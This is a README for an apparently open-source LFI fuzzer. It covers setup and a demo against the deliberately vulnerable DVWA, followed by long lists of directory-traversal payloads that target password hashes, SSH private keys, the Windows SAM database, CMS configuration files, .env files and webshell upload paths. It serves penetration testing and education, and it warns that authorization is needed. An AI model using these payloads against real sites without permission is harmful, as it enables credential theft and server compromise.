
# LFI-FUZZER

## Created by:
* s3v3ns  | LABS

# Note:
Using these payloads on sites without permission can be illegal. Always ensure you have authorization before testing any site. For Educational purposes test this on DVWA

## Description
This is a simple LFI Fuzzer. An LFI Fuzzer is a Python tool for discovering Local File Inclusion (LFI) vulnerabilities in web applications.
The script scans for vulnerable endpoints by sending payloads and checking the responses for sensitive file contents.


## Features
- Load LFI payloads from a file (payloads.txt).
- Scan web applications for vulnerable file inclusions.
- Output the vulnerable URLs detected.


## Install && Usage :
1. Clone the repository :
   ```bash
   git clone https://github.com/S3V3NsLabs/LFI-FUZZER.git
   ```

2. Navigate to LFI-FUZZER directory:
   ```bash
   cd LFI-FUZZER
   ```

3. Place your `payloads.txt` file in the root directory with desired payloads.

4. Run LFI FUZZER:
   ```bash
   python3 lfi_scanner.py
   ```

## Example `payloads.txt`
```text
../../etc/passwd
../../../wp-config.php
../../../../windows/win.ini
```


## Demo :  Using LFI Fuzzer against DVWA (Damn Vulnerable Web Application)

### Overview:

Test this script on DVWA:  **LFI-FUZZER** tool to detect Local File Inclusion (LFI) vulnerabilities in DVWA, a deliberately vulnerable web application designed for security testing. This guide walks through the process step by step.

### Prerequisites:

- **DVWA** installed and running (with low security level).
- **LFI-FUZZER** downloaded and configured with appropriate payloads.
- Python3 and requests library installed.

### Setting Up DVWA:

1. Download and set up DVWA on your local machine or server.
   - Follow [DVWA installation instructions](https://github.com/digininja/DVWA) to get it running.
   - Ensure you have set the security level to **low** (you can adjust it later for different security levels).

2. Once DVWA is running, navigate to the **File Inclusion** vulnerability page under **Vulnerabilities** in the DVWA interface.

### Running LFI-FUZZER Against DVWA:

1. Open a terminal and navigate to the LFI-FUZZER directory:
   ```bash
   cd LFI-FUZZER
   ```

2. Edit the **payloads.txt** file to include payloads targeting the file inclusion vulnerability. Example:

   ```text
   ../../../../etc/passwd
   ../../../../var/www/dvwa/config/config.inc.php
   ../../../windows/win.ini
   ```

3. Run the **lfi_scanner.py** script against the **DVWA File Inclusion** page:

   ```bash
   python3 lfi_scanner.py
   ```

4. Enter the vulnerable URL (for example):

   ```bash
   http://localhost/dvwa/vulnerabilities/fi/?page=
   ```

5. The script will iterate through the target tailored payloads in payloads.txt. The script will appending each line (payload) to the target URL, checking the responses for common LFI vulnerability indicators such as `/etc/passwd` content. The payloads text file can have whitespace, the python script will strip any whitespace

### Example Output:

The scanner will indicate when it finds an LFI vulnerability:
```bash
Testing: http://localhost/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
[+] Vulnerable to LFI: http://localhost/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
```

# PAYLOADS: 

## By editing payloads.txt, you can expand the list based on the specific environment or application you are testing.

### **How to Use the Payloads.txt File**
- **Edit the payloads.txt** file in the root directory of your project.
- The LFI Fuzzer will automatically load the payloads from this file and use them to test vulnerable endpoints in web applications.

Let me know if you need any more adjustments !!


#LFI Fuzzer Payloads: Common Use Cases and Sensitive File Paths
1. Local File Inclusion (LFI) Vulnerabilities in Linux-based Systems: Local File Inclusion (LFI) occurs when an application dynamically includes files based on user input. This is commonly found in Linux systems, and attackers often target configuration files or sensitive system files.

##Common Sensitive File Paths:
```bash
../../../../../../etc/passwd                     # Linux password file, critical for user info
../../../../../../etc/shadow                     # Password hashes (requires root permissions)
../../../../../../etc/hosts                      # Hosts file for local network names
../../../../../../etc/hostname                   # System hostname
../../../../../../etc/mysql/my.cnf               # MySQL config file containing database credentials
../../../../../../proc/self/environ              # Environmental variables (might include user sessions)
../../../../../../var/log/auth.log               # Authentication logs (login history)
../../../../../../var/mail/root                  # Emails sent to root user
../../../../../../var/log/dmesg                  # Kernel logs
../../../../../../root/.ssh/id_rsa               # Private SSH key for root access
```

## 2. Windows-based System: Traversal Paths:  Windows-based systems also contain sensitive files that can be accessed via LFI vulnerabilities. The file paths in Windows follow a different structure.
```bash
../../../../../../windows/win.ini                # Basic system settings (legacy but sensitive)
../../../../../../windows/system32/drivers/etc/hosts  # Windows hosts file
../../../../../../windows/system32/config/sam     # Security Account Manager database (password hashes)
../../../../../../windows/system32/config/system  # Windows registry settings
../../../../../../windows/system32/config/software  # Installed software information
../../../../../../windows/system32/config/security # Security settings for the OS
../../../../../../windows/system32/license.rtf    # Windows license file
../../../../../../windows/repair/sam              # Backup of the SAM file
../../../../../../inetpub/wwwroot/web.config      # IIS web server configuration
../../../../../../windows/system32/drivers/etc/services  # List of network services
```
##3. Common Web Applications (WordPress, Joomla, Drupal, etc.): Many web applications store their configuration files in predictable locations, which can be exploited using LFI vulnerabilities.

# WordPress LFI Payloads
```bash
../../../../../../wp-config.php                  # WordPress configuration file (DB credentials, salts)
../../../../../../wp-content/debug.log           # Debug log (if debug mode is enabled)
../../../../../../wp-content/uploads/.htaccess   # Hidden files or configuration in uploads
../../../../../../wp-content/uploads/evil.php    # Target for file upload vulnerabilities
../../../../../../wp-includes/rss-functions.php  # Include files used for RSS feeds
../../../../../../wp-admin/.htpasswd             # Password-protected file for the wp-admin area
../../../../../../wp-content/themes/twentytwenty/index.php  # Theme file inclusion
../../../../../../wp-includes/class-wp-user.php  # User authentication file
../../../../../../wp-content/uploads/.db         # Backup database files
../../../../../../wp-content/uploads/wp-backup.sql  # SQL database backups
```

# Joomla LFI Payloads
```bash
../../../../../../configuration.php              # Joomla main configuration file
../../../../../../administrator/logs/error.php   # Error logs
../../../../../../tmp/shell.php                  # Exploitable upload paths
../../../../../../cache/sessions/sess_abc123     # Joomla session files
../../../../../../libraries/joomla/database/table/user.php  # User table and authentication code
../../../../../../logs/joomla.php                # Joomla log file
../../../../../../administrator/manifests/files/joomla.xml  # Installed Joomla components
../../../../../../language/en-GB/en-GB.xml       # Language files, possibly sensitive configs
../../../../../../tmp/joomla_update.sql          # Database update files
../../../../../../tmp/backup.sql                 # Backup SQL files
```

# Drupal LFI Payloads
```bash
../../../../../../sites/default/settings.php     # Drupal main settings file (DB credentials)
../../../../../../sites/default/files/.htaccess  # Hidden files protection
../../../../../../sites/default/files/tmp/shell.php  # Exploitable upload directory
../../../../../../sites/all/modules/views/includes/view.inc  # View module files
../../../../../../sites/all/modules/admin_menu/includes/menu.inc  # Admin menu files
../../../../../../sites/default/files/private/private_file.txt  # Private file directory
../../../../../../core/modules/user/user.module  # User module for authentication
../../../../../../core/modules/system/system.module  # System module for configuration
../../../../../../sites/all/libraries/tcpdf/config/tcpdf_config.php  # PDF library configuration
../../../../../../sites/default/files/temp/.htpasswd  # Password-protected temp files
```

# 4. Common Web Applications (WordPress, Joomla, Drupal, etc.): Many web applications store their configuration files in predictable locations, which can be exploited using LFI vulnerabilities.

## Database Configuration Files
```bash
../../../../../../var/www/html/phpMyAdmin/config.inc.php  # phpMyAdmin config file (DB credentials)
../../../../../../etc/mysql/my.cnf               # MySQL config file (DB credentials)
../../../../../../etc/postgresql/9.5/main/pg_hba.conf  # PostgreSQL config file (access settings)
../../../../../../etc/httpd/conf/httpd.conf      # Apache HTTPD configuration (may contain DB paths)
../../../../../../etc/nginx/nginx.conf           # Nginx configuration (may contain DB paths)
../../../../../../opt/lampp/phpmyadmin/config.inc.php  # XAMPP phpMyAdmin config
../../../../../../usr/local/etc/mongodb.conf     # MongoDB configuration
../../../../../../var/lib/mysql/mysql-bin.index  # MySQL binary logs (DB transactions)
../../../../../../var/lib/mysql/ibdata1          # MySQL data file (contains all the databases)
../../../../../../etc/apache2/sites-available/000-default.conf  # Apache site config
```

#5. Environment and Session Files: Log Files: Log files may contain sensitive information such as user activity, errors, or even API keys and tokens.

## Log Files:
```bash
../../../../../../var/log/apache2/access.log      # Apache access logs (user requests)
../../../../../../var/log/apache2/error.log       # Apache error logs
../../../../../../var/log/nginx/access.log        # Nginx access logs
../../../../../../var/log/nginx/error.log         # Nginx error logs
../../../../../../var/log/syslog                  # System logs
../../../../../../var/log/auth.log                # Authentication logs
../../../../../../var/log/kern.log                # Kernel logs
../../../../../../var/log/secure                  # Secure logs (user login attempts)
../../../../../../var/log/faillog                 # Failed login attempts
../../../../../../var/log/dmesg                   # Kernel ring buffer logs
```

# 6. Environmental and Session Data: Environmental data and session files can expose critical information about the environment, such as API keys, sessions, and user tokens.

##Common Environment and Session Files:
```bash
../../../../../../proc/self/environ               # Environment variables
../../../../../../proc/version                    # Kernel version info
../../../../../../var/lib/php/sessions/sess_abc123  # PHP session files
../../../../../../var/www/html/.env               # Environmental files containing sensitive config
../../../../../../var/www/html/.htaccess          # Hidden file configuration
../../../../../../var/tmp/.session                # Temporary session storage
../../../../../../tmp/.session                    # Temporary session storage
../../../../../../var/www/html/tmp/shell.php      # Temporary file upload for webshells
../../../../../../home/user/.bash_history         # Command history of users
../../../../../../home/user/.ssh/known_hosts      # SSH known hosts file
```

